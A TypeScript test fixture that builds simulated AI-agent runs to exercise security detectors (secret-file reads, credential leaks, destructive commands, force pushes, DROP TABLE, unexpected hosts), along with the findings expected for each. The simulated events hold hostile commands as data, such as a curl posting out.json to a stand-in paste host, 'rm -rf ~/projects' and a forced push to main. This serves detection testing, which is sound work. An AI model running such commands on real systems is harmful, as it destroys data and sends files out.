import type { EventOut, FindingOut } from "@/lib/api/types";
import { FIXTURE_EPOCH, RunBuilder, type FixtureRun } from "./builder";
import { fid } from "./ids";

/**
 * Phase 13 fixtures: three runs that trip the security detectors, and the findings the API would store for them. The
 * wording below is the API's constant wording (apps/api/src/abb_api/findings/security_words.py); a finding carries
 * no path, command, host or key, while the events it cites do (for the owner; a viewer sees them withheld). The
 * events hold recognisable sentinel content so tests can prove a finding never repeats it.
 */
const MIN = 60_000;

type Words = { title: string; message: string };
const WORDS: Record<string, Words> = {
  secret_file_read: {
    title: "Probable: a file that usually holds secrets was accessed",
    message: "The agent read or changed a file whose name marks it as holding secrets.",
  },
  credential_in_output: {
    title: "Probable: a credential appeared in captured text",
    message: "Captured text contained a credential; it was redacted before it was stored.",
  },
  destructive_command: {
    title: "Probable: a destructive command was run",
    message: "The agent ran a command that can delete data or damage the system.",
  },
  risky_git: {
    title: "Probable: a risky git operation was run",
    message:
      "The agent ran a git operation that forces a push, rewrites history or changes a protected branch.",
  },
  privileged_db: {
    title: "Probable: a privileged database statement was run",
    message:
      "The agent ran a database statement that changes structure or changes rows without a filter.",
  },
  unexpected_destination: {
    title: "Probable: a host outside the allowlist was contacted",
    message: "The agent contacted a host that is not on this project's allowlist.",
  },
};
const RULES: Record<string, string> = {
  secret_file_read: "path matched a secret-file name",
  credential_in_output: "a redaction record names a credential pattern",
  destructive_command: "server re-check matched a destructive pattern (R4)",
  risky_git: "git push used a force option",
  privileged_db: "SQL passed to a database client was DDL or changed rows without WHERE",
  unexpected_destination: "host is not on the project allowlist",
};

/** Strings that must never reach a finding, the Security page or a viewer. Tests plant and search for them. */
export const SECURITY_SENTINELS = [
  ".env.production",
  "AKIAFIXTURESENTINEL",
  "pastebin.example.net",
  "DROP TABLE customers",
  "git push --force origin main",
  "rm -rf ~/projects",
];

export type SecSpec = {
  type: keyof typeof WORDS;
  severity: FindingOut["severity"];
  /** Events the finding cites; empty for an artifact-only credential finding. */
  events: EventOut[];
};

function base(n: number, name: string, agent: string, startMin: number) {
  const b = new RunBuilder(n, name, agent, FIXTURE_EPOCH + startMin * MIN);
  b.add("run.started", { "run.name": name }, 0);
  b.add("agent.started", {}, 100, { span_id: b.span(1) });
  return b;
}
const close = (b: RunBuilder) => {
  b.add("agent.completed", {}, 200, { span_id: b.span(1), status: "success" });
  b.add("run.completed", {}, 100, { status: "success" });
};
const shell = (b: RunBuilder, command: string) => {
  b.add("shell.command.started", { "shell.command": command, "shell.cwd": "/repo" }, 300);
  return b.add("shell.command.completed", { "shell.command": command, "shell.exit_code": 0 }, 800, {
    status: "success",
    duration_ms: 800,
  });
};

type Built = { run: FixtureRun; specs: SecSpec[] };

function leakedKey(): Built {
  const b = base(14, "Deploy with leaked key", "deploy-agent", -300);
  const envRead = b.add("file.read", { "file.path": ".env.production" });
  const leak = b.add(
    "tool.call.completed",
    {
      "tool.name": "print_config",
      "redaction.server_count": 1,
      "redaction.server_kinds": ["aws_access_key"],
    },
    500,
    { status: "success", span_id: b.span(2), parent_span_id: b.span(1) },
  );
  const clean = shell(b, "git clean -fdx");
  const force = shell(b, "git push --force origin main");
  const sql = shell(b, `psql -c "DROP TABLE customers"`);
  const host = shell(b, "curl -d @out.json https://pastebin.example.net/up");
  close(b);
  return {
    run: b.build(),
    specs: [
      { type: "credential_in_output", severity: "critical", events: [leak] },
      { type: "secret_file_read", severity: "high", events: [envRead] },
      { type: "destructive_command", severity: "high", events: [clean] },
      { type: "risky_git", severity: "high", events: [force] },
      { type: "privileged_db", severity: "high", events: [sql] },
      { type: "unexpected_destination", severity: "medium", events: [host] },
    ],
  };
}

function nightly(): Built {
  const b = base(15, "Nightly dependency update", "deps-agent", -260);
  const npmrc = b.add("file.read", { "file.path": "/home/agent/.npmrc" });
  const a = shell(b, "npm install --registry https://registry.example.net");
  const sql = shell(b, `psql -c "DROP TABLE customers"`);
  const host = shell(b, "curl https://pastebin.example.net/up");
  close(b);
  return {
    run: b.build(),
    specs: [
      { type: "secret_file_read", severity: "high", events: [npmrc] },
      { type: "unexpected_destination", severity: "medium", events: [a, host] },
      { type: "privileged_db", severity: "high", events: [sql] },
    ],
  };
}

function exportLogs(): Built {
  const b = base(16, "Export build logs", "ci-agent", -220);
  const rm = shell(b, "rm -rf ~/projects");
  const host = shell(b, "curl https://pastebin.example.net/up");
  close(b);
  return {
    run: b.build(),
    specs: [
      // An artifact held the key and no event cites it: the finding has no event to show.
      { type: "credential_in_output", severity: "critical", events: [] },
      { type: "destructive_command", severity: "critical", events: [rm] },
      { type: "unexpected_destination", severity: "medium", events: [host] },
    ],
  };
}

let cache: Built[] | undefined;
const built = (): Built[] => (cache ??= [leakedKey(), nightly(), exportLogs()]);

export const securityFixtureRuns = (): FixtureRun[] => built().map((b) => b.run);

/** The security findings `GET /v1/runs/{id}/findings` carries for one of these runs (none for any other). */
export function securityFindingsFor(f: FixtureRun): FindingOut[] {
  const hit = built().find((b) => b.run.run.id === f.run.id);
  if (!hit) return [];
  const at = f.run.updated_at;
  return hit.specs.map((s, i) => {
    const ids = s.events.map((e) => e.event_id);
    const w = WORDS[s.type]!;
    return {
      id: fid("fnd", Number(f.run.id.slice(-6)) * 100 + 50 + i),
      run_id: f.run.id,
      category: "security",
      detector: `sec.${s.type}`,
      detector_version: `sec.${s.type}@1.0.0`,
      finding_type: s.type,
      kind: "probable",
      severity: s.severity,
      confidence: 0.85,
      title: w.title,
      message: w.message,
      start_event_id: ids[0] ?? null,
      end_event_id: ids[ids.length - 1] ?? null,
      evidence_event_ids: ids,
      evidence: {
        rule: RULES[s.type],
        rules: [RULES[s.type]],
        count: Math.max(ids.length, 1),
        event_ids: ids,
        ...(s.type === "credential_in_output" ? { kinds: ["aws_access_key"] } : {}),
      },
      fingerprint: (`${i + 1}`.padStart(2, "0") + "5ec0de1").repeat(10).slice(0, 64),
      created_at: at,
      updated_at: at,
    } satisfies FindingOut;
  });
}
